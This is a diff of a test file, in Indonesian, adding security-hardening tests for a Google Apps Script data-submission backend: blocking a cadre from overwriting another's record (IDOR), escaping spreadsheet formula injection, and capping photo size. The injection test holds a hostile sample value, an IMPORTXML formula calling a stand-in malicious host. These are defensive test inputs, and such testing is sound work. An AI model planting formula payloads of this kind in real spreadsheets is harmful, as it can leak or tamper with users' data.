@@ -339,7 +339,7 @@ describe("Code.gs: folder wilayah dan nama berkas", () => {
   });
 });
 
-describe("Code.gs: penyimpanan idempoten", () => {
+describe("Code.gs: penyimpanan idempoten dan pengamanan (hardening)", () => {
   it("kirim ulang memperbarui fitur dan baris yang sama, status verifikasi admin di sheet dipertahankan", () => {
     const L = buatLingkungan();
     L.kirim(payload([rec("a"), rec("b")]));
@@ -354,6 +354,35 @@ describe("Code.gs: penyimpanan idempoten", () => {
       ["a", "Sebaran Anggrek (diperbarui)"],
       ["b", "Sebaran Anggrek"]
     ]);
+  });
+
+  it("menolak penimpaan ID data milik kader lain (anti-IDOR) dan tidak menghapus berkas pemilik asli", () => {
+    const L = buatLingkungan();
+    L.kirim(payload([rec("a", { idKader: "KDR-1", namaKader: "Budi" })]));
+    const serang = L.kirim(
+      payload([rec("a", { idKader: "KDR-PENYERANG", namaKader: "Penyerang", namaBerkas: "penyerang_palsu_november_2026" })])
+    );
+    expect(serang.sukses).toBe(false);
+    expect(serang.diterima).toEqual([]);
+    expect((serang.gagal as { id: string; pesan: string }[])[0].pesan).toMatch(/milik kader lain/);
+    const kepala = L.tabData().baris[0];
+    expect(L.tabData().baris[1][kepala.indexOf("ID_Kader")]).toBe("KDR-1");
+  });
+
+  it("menetralkan injeksi formula spreadsheet (=, +, -, @) dengan tanda kutip tunggal", () => {
+    const L = buatLingkungan();
+    L.kirim(payload([rec("a", { judul: '=IMPORTXML("https://jahat.tld","//a")', namaLokal: "+SUM(A1:A2)" })]));
+    const [kepala, baris] = L.tabData().baris;
+    expect(baris[kepala.indexOf("Judul")]).toBe('\'=IMPORTXML("https://jahat.tld","//a")');
+    expect(baris[kepala.indexOf("Nama_Lokal")]).toBe("'+SUM(A1:A2)");
+  });
+
+  it("menolak foto yang melebihi batas 2 MB", () => {
+    const L = buatLingkungan();
+    const besar = "data:image/jpeg;base64," + Buffer.alloc(2 * 1024 * 1024 + 10, 0x41).toString("base64");
+    const h = L.kirim(payload([rec("terlalu-besar", { fotoBase64: besar })]));
+    expect(h.sukses).toBe(false);
+    expect((h.gagal as { id: string; pesan: string }[])[0].pesan).toMatch(/melebihi batas 2 MB/);
   });
 
   it("foto diunggah sekali per objek dengan nomor urut; kirim ulang tidak mengunggah lagi", () => {
